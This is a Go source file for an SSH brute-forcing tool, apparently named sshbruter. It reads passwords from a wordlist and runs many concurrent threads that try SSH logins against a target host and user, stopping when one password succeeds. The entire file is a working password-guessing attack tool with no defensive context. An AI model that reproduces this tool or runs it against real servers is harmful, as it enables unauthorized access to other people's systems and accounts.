package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strconv"

	"github.com/usdogu/sshbruter/functions"
)

var datas *functions.Options

func init() {
	datas = functions.Parse()
}
func main() {
	showInfo()
	wordlistreader()

}

func wordlistreader() {

	workQueue := make(chan string)

	complete := make(chan bool)

	go func() {
		file, err := os.Open(datas.Wordlist)
		if err != nil {
			log.Fatal(err)
		}

		defer file.Close()

		scanner := bufio.NewScanner(file)

		for scanner.Scan() {
			workQueue <- scanner.Text()
		}

		close(workQueue)
	}()

	for i := 0; i < datas.Threads; i++ {
		go bruter(workQueue, complete)
	}

	for i := 0; i < datas.Threads; i++ {
		<-complete
	}
}

func bruter(queue chan string, complete chan bool) {

	for line := range queue {
		cfg := functions.New(line, datas.User, datas.Timeout)
		conn, err := functions.Connect(datas.Host, datas.Port, cfg)
		if err != nil {
			if datas.Verbose {
				log.Printf("Failed : %s", line)
			}
		}
		if conn {
			fmt.Printf("[SUCCESS] Connected with %s\n", line)
			fmt.Println("Exiting...")
			os.Exit(0)
		}
	}
	complete <- true
}

func showInfo() {
	info := "\n :: Username: " + datas.User
	info += "\n :: Hostname: " + datas.Host
	info += "\n :: Port    : " + strconv.Itoa(datas.Port)
	info += "\n :: Wordlist: " + datas.Wordlist
	info += "\n :: Threads : " + strconv.Itoa(datas.Threads)
	info += "\n :: Timeout : " + datas.Timeout.String()
	info += "\n________________________\n\n"

	fmt.Print(info)
}
